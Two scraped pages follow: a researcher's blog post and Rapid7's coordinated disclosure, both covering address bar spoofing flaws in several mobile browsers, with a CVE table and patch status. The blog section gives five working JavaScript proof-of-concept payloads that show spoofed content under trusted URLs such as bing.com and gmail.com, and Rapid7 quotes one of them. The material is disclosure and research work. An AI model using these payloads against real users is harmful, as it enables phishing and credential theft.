=== Content from www.rafaybaloch.com_d47ad61b_20250119_123800.html ===


* [Home](https://www.rafaybaloch.com/)
* [About](https://www.rafaybaloch.com/p/about-me.html)
* [Disclaimer](https://www.rafaybaloch.com/p/disclaimer.html)
* [Privacy Policy](https://www.rafaybaloch.com/p/privacy-policy.html)
* [Publications](https://www.rafaybaloch.com/p/publications.html)
* [Contact](/cdn-cgi/l/email-protection#592b383f38203b3835363a31193e34383035773a3634)

[![Miscellaneous Ramblings of a Cyber Security Researcher](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEil0y7er6Mwno5r_j_tTYaWOQYiAUl6Bks_QljjxuTAPDryJ3c6gT8odFzMDnmkOFyo-VLRel1BXTYXdmfp_sQWuxiVLMNr_2uqbRFSNZftzpmGml02KSKJ-NjfYP6FKF_xdCA9bVnuYAQ/s221/logo-png.png)](https://www.rafaybaloch.com/)

Hi, I am Rafay Baloch, a security researcher, author and a public speaker.

[Home](https://www.rafaybaloch.com/)
Unlabelled
Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers

# Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers

[6:19 AM](https://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html "permanent link")

## Background

Google on their [Google Vulnerability Reward Program (VRP) rules](https://www.google.co.uk/about/appsecurity/reward-program/) classifies
address bar as the only reliable security indicator in order to validate the
authenticity of the website. To quote them, “We recognize that the address
bar is the only reliable security indicator in modern browsers”. Since the
inception of Covid-19, a remarkable increase in spear phishing attacks has
been recorded.

As per a report by [Zscaler](https://www.infosecurity-magazine.com/news/experts-detect-30000-increase/) in April 2020, a significant increase of about
85% increase in phishing attacks were recorded in April, aimed at targeting
remote workers in which attackers had registered domains featuring Covid-19
related keywords such as “wuhan”, “vaccine” etc. in order to steal
credentials, disseminate malware, most notably ransomware for conducting
financial frauds. More recently, Microsoft in its [Microsoft Digital Defense Report](https://www.microsoft.com/en-us/download/details.aspx?id=101738), has highlighted about the increasing sophistication of
cyber threats and has categorized email phishing as the most dominant attack
vector for enterprises.

With ever growing sophistication of spear phishing attacks, exploitation of
browser-based vulnerabilities such as address bar spoofing may exacerbate
the success of spear phishing attacks and hence prove to be very lethal.
First and foremost, it is easy to persuade the victim into stealing
credentials or distributing malware when the address bar points to a trusted
website and giving no indicators forgery, secondly since the vulnerability
exploits a specific feature in a browser, it can evade several anti-phishing
schemes and solutions.

In the past, I have uncovered several address bar spoofing vulnerabilities
in Desktop & Mobile browsers, writeups of which can be found here, here
and here. Apart from which, I presented a paper at Blackhat “[Bypassing Browser Security Policies for Fun and Profit](https://www.rafaybaloch.com/2017/06/bypassing-browser-security-policies-for.html) “ which discussed various types
of spoofing related issues.

More recently, as a part of my thesis while perusing MSC in Cyber Security,
I had written a framework for testing various categories of browser
vulnerabilities such as UXSS, file cross attacks, CSP bypasses and spoofing
attacks. The results uncovered several security address bar spoofing
vulnerabilities in mobile browsers.

Note: Before diving into the technical details, I would like to mention here that the vulnerability disclosure was handled by Tod Bearsley of Rapid7, you can read about their disclosure.
## Technical Details

The following section will discuss about vulnerabilities found in browsers
along with their POC. It is imperative to mention here that similar issues
have been found in several other browsers, however they will be published
once the coordinated disclosure timeline has been elapsed.

The following is a proof of concept (POC) demonstrating a browser based
spoofing vulnerability

Safari for both iOS and Mac. The vulnerability occurs due to Safari
preserving address bar of the URL when requested over an arbitrary port,
the set interval function reloads bing.com:8080 every 2 milliseconds and
hence user is unable to recognize the redirection from the original URL to
spoofed URL. What makes this vulnerability more effective in Safari by
default does not reveal port number in URL unless and until focus is set
via cursor.

## Address Bar Spoofing – Vulnerability 1

### Proof of Concept

<script>
    document.write("<h1>This is not
Bing</h1>");

    location.href = "https://bing.com:8081";

    setInterval(function(){location.href="https://bing.com:8080"},2000);

</script>

Note: The value of setInterval function maybe adjusted according to the
browser in order to achieve an effective URL spoof.

|  |
| --- |
| Figure 1: Address Bar spoofing in MAC OS HIGH SIERRA 10.13.6 (17G14019) |

|  |
| --- |
| Figure 2: Address Bar spoofing in Safari Version 13.1.2 (13609.3.5.1.5) on 13.6.1 |

## Address Bar Spoofing – Vulnerability 2

### Proof of Concept

The following is a proof of concept (POC) demonstrating a browser
based spoofing vulnerability

in yandex browser for android and opera touch for iOS:

<p class="test"><input class="btn btn-success btn-lg"
type="button" value="Run test case"

    onclick="win =
window.open(&quot;https://www.facebook.com:8080&quot;,&quot;WIN&quot;);

    window.open(&quot;https://www.bing.com&quot;,
&quot;WIN&quot;);

    win.window.stop();
    win.document.write('This is not
Facebook');

    win.document.close();
" /></p>

|  |
| --- |
| Figure 3: Address Bar spoofing vulnerability in Yandex browser for android |

|  |
| --- |
| Figure 4: Address Bar spoofing vulnerability in opera touch for iOS |

## Address Bar Spoofing – Vulnerability 3

### Proof of Concept

The following is a proof of concept (POC) demonstrating a browser
based spoofing vulnerability

in UC Browser for android and opera touch iOS:

<script>
    function spoof() {
    document.write("<h1>This is
not Bing</h1>");

    document.location =
"https://bing.com:1234";

    setInterval(function(){document.location="https://bing.com:1234";},9800);

    };
</script>
<p class="test"><input class="btn btn-success btn-lg"
type="button" value="Run test case" onclick="spoof();" />

</p>

|  |
| --- |
| Figure 5: Address Bar spoofing vulnerability in UC browser for android |

|  |
| --- |
| Figure 6: Address Bar spoofing vulnerability in Opera Touch for iOS |

## Address Bar Spoofing – Vulnerability 4

### Proof of Concept

The following is a proof of concept (POC) demonstrating a browser
based spoofing vulnerability in Opera browser for iOS. Apparently,
data scheme followed by arbitrary URL leads to preservation of the
URL and hence triggers address bar spoofing condition.

<h2>Spoof 13</h2>
<script>
function pocccc(){
var w=open('data://google.com');
w.document.body.innerHTML='This is not google';
}
</script>
<p class="test"><input class="btn btn-success btn-lg"
type="button" value="Run test case"

onclick="pocccc();" />
</p>

|  |
| --- |
| Figure 7: Address Bar spoofing vulnerability in Opera touch Browser |

## Address Bar Spoofing – Vulnerability 5

### Proof of Concept

The following is a proof of concept (POC) demonstrating a browser
based spoofing vulnerability

in UC browser for Android, Opera browser for Android, RITS browser
for Android, Bolt Browser for IOS:

<script>
function spoof()
{
var gmail = 'PCFET0NC8+KArOK........ZHk+PC9odG1sPg=='; //The
base64 encoded version of the Gmail page

x=document.body.innerHTML=atob(gmail);
document.write("<title>Gmail</title>");
document.write("x");
window.location.assign("https://www.Gmail.com:8080");
}
setInterval(spoof(),100000);
</script>

|  |
| --- |
| Figure 8: Address Bar spoofing vulnerability in UC Browser Android |

|  |
| --- |
| Figure 9: Address Bar spoofing vulnerability in Opera Mini Android |

|  |
| --- |
| Figure 10: Address Bar spoofing vulnerability in RITS Browser |

|  |
| --- |
| Figure 11: Address bar spoofing vulnerability in Bolt BROWSER IOS |

## Vulnerability Disclosure and Coordination

The vulnerability disclosure was handled by Tod Beardsley of
Rapid7 who is the go-to guy for any coordinated disclosures. As
per industry’s standard practice, a timeframe of 60 days was
assigned to all entities for issuing a patch. While Apple and Opera responded immediately to the initial disclosure, Yandex and RITS responded shortly before publication. RITS and Opera have committed to fixes in their next release, while Yandex and Safari have already issued updates as of this writing

It’s is pertinent to mention here that several mobile browsers
with huge user-base do not even have a dedicated email for
reporting security vulnerabilities, which discourages security
researchers from reporting security vulnerabilities. Google Chrome
and Firefox have a bug bounty program in which both Desktop and
mobile browsers are in-scope, where as Microsoft’s bug bounty
program is only limited to Desktop version. Apart from which there
is a small subset of mobile browsers incentivizing security
researchers and bug bounty hunters for reporting vulnerabilities.

## Acknowledgements

I am highly indebted to Tod Beardsley for assisting with
responsible disclosures since 2016. I am also thankful to Dr.
Muhammad Yousaf Head of Computer Sciences at Riphah University for
supervising my thesis which resulted in uncovering novel security
issues.

[![](http://img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=2219569080572207173&postID=2392893541486468481&from=pencil "Edit Post")

SHARES

[Share](https://www.facebook.com/share.php?v=4&u=http://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html&t=Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers "Share on Facebook!")

[Pin it](https://pinterest.com/pin/create/button/?url=http://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html&media=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj84vLFo3KfD1VxMMEakdht4vOG7xCX3OkIav2x0nFa_z8Y5r4JTI70KjoKadY0beGGslIpzNPFrScqnP0H5joLNgIVeS1K79TWhBgmogDF5ZuYvfDAAHi_bReacGdPpmVswiemtmlhhfo/s72-w640-c-h192/1.tif&description=Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers "Pin it!")

[Tweet](https://twitter.com/home?status=Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers-http://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html "Share on Twitter!")

[Share](http://www.linkedin.com/shareArticle?mini=true&url=http://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html "Share on Linkedin!")

[Share](https://plus.google.com/share?url=http://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html "Share on Google Plus!")

[Share](http://www.stumbleupon.com/submit?url=http://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html "Stumble it!")

[![](https://3.bp.blogspot.com/-eYyUk4KGuBg/Vs-oFm656VI/AAAAAAAAQfE/maUNyJ9PWqE/s1600/logo-icon.png)Buffer](https://buffer.com/add?url=http://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html&picture=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj84vLFo3KfD1VxMMEakdht4vOG7xCX3OkIav2x0nFa_z8Y5r4JTI70KjoKadY0beGGslIpzNPFrScqnP0H5joLNgIVeS1K79TWhBgmogDF5ZuYvfDAAHi_bReacGdPpmVswiemtmlhhfo/s72-w640-c-h192/1.tif&text=Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers&via=stc_network "Share on Buffer!")

Print

## Cyber Security Services

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhu-6P6KiduTUzNW8nyRPHDYh4KQOQP_lXaPW1DoX41AK8dA_Lgg0Qv__aupD0LMOOxySi4s8MOGjhAk1kOmZtuFqjkE5alC2ZxxrOKkO-ofJP7Imw-MnvdCNscn5brygR753GJYZMBLrOCaILtufM_YqCQt3ch1AcArkGgczc3qduTQnTIR7WzSLBH8Jf4/s1024/tmgm.jpeg)](https://redseclabs.com)

## Book

[![](https://m.media-amazon.com/images/I/81sBOm8txNL._SL1500_.jpg)](https://www.amazon.com/Ethical-Hacking-Penetration-Testing-Guide-ebook/dp/B00MMOJ7CY/?_encoding=UTF8&pd_rd_w=2ZLZy&content-id=amzn1.sym.da24a24a-8edd-4b61-8b08-8da82b8fa54e%3Aamzn1.symc.0be80b80-fece-46bc-88bd-c8e6394f049e&pf_rd_p=da24a24a-8edd-4b61-8b08-8da82b8fa54e&pf_rd_r=EXR4DDZYJZVPCHT312F1&pd_rd_wg=MsLha&pd_rd_r=93a9f8fc-d3d4-41c7-9cc7-23acaba96a0e&ref_=pd_gw_ci_mcx_mr_hp_atf_m)

## Rafay's Blackhat Talk

## Categories

[Vulnerabilities](https://www.rafaybaloch.com/search/label/Vulnerabilities)
(32)

[POC](https://www.rafaybaloch.com/search/label/POC)
(21)

[Breaches](https://www.rafaybaloch.com/search/label/Breaches)
(12)

[Bug Bounty](https://www.rafaybaloch.com/search/label/Bug%20Bounty)
(11)

[Security Flaws](https://www.rafaybaloch.com/search/label/Security%20Flaws)
(9)

[Ethical Hacking](https://www.rafaybaloch.com/search/label/Ethical%20Hacking)
(7)

[Mobile Security](https://www.rafaybaloch.com/search/label/Mobile%20Security)
(7)

[Web App Security](https://www.rafaybaloch.com/search/label/Web%20App%20Security)
(5)

[Web Server Security](https://www.rafaybaloch.com/search/label/Web%20Server%20Security)
(5)

[Cyber Attacks](https://www.rafaybaloch.com/search/label/Cyber%20Attacks)
(4)

[Penetration Testing](https://www.rafaybaloch.com/search/label/Penetration%20Testing)
(4)

[Website Security](https://www.rafaybaloch.com/search/label/Website%20Security)
(4)

[Courses](https://www.rafaybaloch.com/search/label/Courses)
(3)

[Cyber Security](https://www.rafaybaloch.com/search/label/Cyber%20Security)
(3)

[Security Forensics](https://www.rafaybaloch.com/search/label/Security%20Forensics)
(3)

[Technical Analysis](https://www.rafaybaloch.com/search/label/Technical%20Analysis)
(3)

[espionage](https://www.rafaybaloch.com/search/label/espionage)
(3)

[Online Security](https://www.rafaybaloch.com/search/label/Online%20Security)
(2)

[Presentations](https://www.rafaybaloch.com/search/label/Presentations)
(2)

[Tools](https://www.rafaybaloch.com/search/label/Tools)
(2)

[Website Hacking](https://www.rafaybaloch.com/search/label/Website%20Hacking)
(2)

[Achievements](https://www.rafaybaloch.com/search/label/Achievements)
(1)

[Cheatsheets](https://www.rafaybaloch.com/search/label/Cheatsheets)
(1)

[Manifesto](https://www.rafaybaloch.com/search/label/Manifesto)
(1)

[Network Security](https://www.rafaybaloch.com/search/label/Network%20Security)
(1)

[OS Security](https://www.rafaybaloch.com/search/label/OS%20Security)
(1)

[surveillance](https://www.rafaybaloch.com/search/label/surveillance)
(1)

SIGN UP FOR MY FREE NEWSLETTERLearn How to Excel In Penetration Testing & Become an Expert Security Researcher.

Contact us

 © 2023 All Rights Reserved by [RHA Info Sec.](https://www.rafaybaloch.com/)
[Top](#top)

## Contact Form

Name

Email
\*

Message
\*

Powered by [Blogger](https://www.blogger.com).



=== Content from blog.rapid7.com_9b8b71f5_20250119_123759.html ===


[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg) Sign In](https://insight.rapid7.com/saml/SSO)
[Blog](/blog/ "Blog")

* Select
  + [Vulnerability Management](/blog/tag/vulnerability-management/)
  + [MDR](/blog/tag/mdr-managed-detection-response/)
  + [Detection & Response](/blog/tag/detection-and-response/)
  + [Cloud Security](/blog/tag/cloud-security/)
  + [App Security](/blog/tag/application-security/)
  + [Metasploit](/blog/tag/metasploit/)
  + [All Topics](/blog/tags/)

[Start Trial](/trial/insight/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

* [Blog](/blog/ "Blog")
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [MDR](/blog/tag/mdr-managed-detection-response/)
* [Detection & Response](/blog/tag/detection-and-response/)
* [Cloud Security](/blog/tag/cloud-security/)
* [App Security](/blog/tag/application-security/)
* [Metasploit](/blog/tag/metasploit/)
* [All Topics](/blog/tags/)
[Start Trial](/trial/insight/)

# Vulntober: Multiple Mobile Browser Address Bar Spoofing Vulnerabilities

* Oct 20, 2020
* 9 min read
* [Tod Beardsley](/blog/author/tod-beardsley/)

*Last updated at Tue, 09 May 2023 19:52:33 GMT*

Today, we're announcing a coordinated vulnerability disclosure publication with our longtime mobile hacker friend, Rafay Baloch. If you'd like to just jump straight to the technical details for these vulnerabilities, I invite you to [read his paper here](http://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html). If you want to know more about why this vulnerability class matters, read on!

What we're disclosing today is a set of address bar [spoofing](https://www.rapid7.com/fundamentals/spoofing-attacks/) vulnerabilities that affect a number of mobile browsers, ranging from the more common browsers, like [Apple Safari](https://www.apple.com/safari/) and [Opera Touch](https://apps.apple.com/us/app/opera-touch-web-browser/id1411869974), to the less common, like [Bolt Browser](https://apps.apple.com/us/app/bolt-browser-and-documents/id1366502697) and [RITS Browser](https://play.google.com/store/apps/details?id=acr.browser.raisebrowserfull&hl=en_US). Technically, address bar spoofing is an instance of [CWE-451](https://cwe.mitre.org/data/definitions/451.html) from the Common Weakness Enumeration, and tends to be scored around a [CVSS 4.3](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N&version=3.1) or so, which seems like not that big of a deal.

## Mobile devices and security sigils

But here's the thing: Mobile browsers are a pretty special sort of software that end up acting as a user’s multipass for all types of critical applications in their day-to-day life. Any type of malicious messing with how this application presents itself is kind of a big deal, and can have serious consequences for the user, even if the alterations are relatively minor.

Essentially, if your browser tells you that a pop up notification or a page is "from" your bank, your healthcare provider, or some other critical service you depend on, you really should have some mechanism of validating that source. In mobile browsers, that source begins and ends with the URL as shown in the address bar. The fact of the matter is, we really don't have much else to rely on.

Mobile platforms are notorious for having very little screen real estate for security indicators, and our methods for interrogating security elements are pretty restricted. If you don't believe me, just take your favorite browser on over to [BadSSL.com](https://badssl.com), a great resource for seeing how your browser handles invalid certificates that are invalid for all sorts of reasons. You'll see that there's not a lot of information presented about why certs are invalid, just that they are invalid in a very binary way. And good luck trying to see the cert details of a given valid certificate; on a desktop browser, it's usually something like "click the lock, view the cert." On mobile, it's \*checks notes\* impossible. Yeah.

But we're not talking about cert issues, we're talking about the address bar. Because we have very few ways to actually validate the source of data on our phones, the address bar is pretty much the only bit of screen real estate that developers (angelic and devilish alike) are prohibited from monkeying with. Most browser vendors understand this, and build in controls to prevent "what's shown on the screen" and "where that came from" are inexorably linked, making it difficult to convincingly spoof the location of some text or images. (Note, there's been reporting that [Google is thinking about monkeying with it again](https://arstechnica.com/gadgets/2020/06/google-is-messing-with-the-address-bar-again-new-experiment-hides-url-path/), but that's another fight for another day.)

## Affected browsers

So, with all that for context, here is the surprisingly diverse set of mobile browsers, shown in the table below (note that Opera and Apple are CVE Numbering Authorities in their own right, and will be populating their own CVE identifiers for those issues).

| CVE | Vendor | Browser | Version | Platform | Fixed? |
| --- | --- | --- | --- | --- | --- |
| CVE-2020-7363 | UCWeb | UC Browser | 13.0.8 | Android | Fixed v13.3.2 on Oct 21, 2020 |
| CVE-2020-7364 | UCWeb | UC Browser | 13.0.8 | Android | Fixed v13.3.2 on Oct 21, 2020 |
| CVE-2020-6158 | Opera | Opera Mini | 52.2 | Android | Fixed in version 52.3 Nov. 23, 2020 |
| CVE-2020-6157 | Opera | Opera Touch | 2.4.4 | iOS | Fixed in version 2.4.5 released Sep 15, 2020 |
| CVE-2020-6157 | Opera | Opera Touch | 2.4.4 | iOS | Fixed in version 2.4.5 released Sep 15, 2020 |
| CVE-2020-6157 | Opera | Opera Touch | 2.4.4 | iOS | Fixed in version 2.4.5 released Sep 15, 2020 |
| CVE-2020-7369 | Yandex | Yandex Browser | 20.8 | Android | Automated reply, followed up Oct. 19, 2020. Fix published Oct 1 in version 20.8.4. |
| CVE-2020-7370 | Danyil Vasilenko | Bolt Browser | 1.4 | iOS | Support email bounced, alerted Apple product security |
| CVE-2020-7371 | Raise IT Solutions | RITS Browser | 3.3.9 | Android | Fix expected Oct. 19, 2020 |
| CVE-2020-9987 | Apple | Safari | iOS 13.6 | iOS | Fix released Sept. 16, 2020 |

Now, some browsers are more popular than others, but even some of these relatively obscure browsers have some pretty impressive download stats—the least popular, Bolt, has over 210,000 reviews and ranks No. 47 in the App Store, and UC Browser is probably the most popular non-FOCES browser around, with over 500 million downloads from Google Play. (By the way, FOCES is an initialism I just made up to refer to the "common" browsers Chrome, Firefox, Safari, Opera, and Edge/Explorer) (and yes Opera is still common) (right?). Yandex is pretty popular, too, at over 100 million installs, and RITS is sitting at over a million. So, all together, nothing to sneeze at, installation-wise.

## Exploitation details

Exploitation all comes down to, "Javascript shenanigans." By messing with the timing between page loads and when the browser gets a chance to refresh the address bar, an attacker can cause either a pop-up to appear to come from an arbitrary website or can render content in the browser window that falsely appears to come from an arbitrary website.

In all cases, the victim would have to visit a website that the attacker can post executable javascript to. Normally, this wouldn't include websites like Facebook, Reddit, Twitter, or other online forums (they do a pretty good job in protecting against aforementioned Javascript shenanigans), but would include a website that was set up by the attacker and sent to the victim through a phishing email, a phishing text message, or a post to a popular forum. So, for example, imagine a text message from a spoofed phone number that says, "There is an important message from your payment processor, click here" and then you click without really looking, and end up on a web page that clearly (but falsely) says it's Paypal, and hey, can you give up your password real quick?

This seems like a pretty effective attack, given that the address bar is really the only signal you have to tell "where" your browser "is." As it turns out, there are quite a few ways to get Javascript to monkey with timing, and Rafay goes over all of that in pretty deep technical depth, with proof-of-concept code galore, over at [his paper](http://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html), so if you're the sort who's into reading clever Javascript, definitely check that out. Here's one example out of many:

```
<script>
  function spoof() {
  document.write("<h1>This is not Bing</h1>");
  document.location = "https://bing.com:1234";
    setInterval(function(){document.location="https://bing.com:1234";},9800);
  };
</script>

<p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case"  onclick="spoof();" />

```

The above Javascript renders in a browser as a hyperlink on the "test" text, and when clicked, shows an in-browser rendering of the "This is not Bing" text in a window attributed to bing.com, as shown below.

![](https://lh6.googleusercontent.com/UIZurmZ49fNUWdAEw2m_1tM_kKLX2H3356UGrm0xBjUxUu-6shMEW3MX6JikXzK0qu1cWj9gfjzh-LzFoA2kSWyF-iacULzTFDAxPPM6UkcUShLhJKe3XE8WZXpTqDYQzxI4JK0b)

*Opera Mini spoofed address bar*

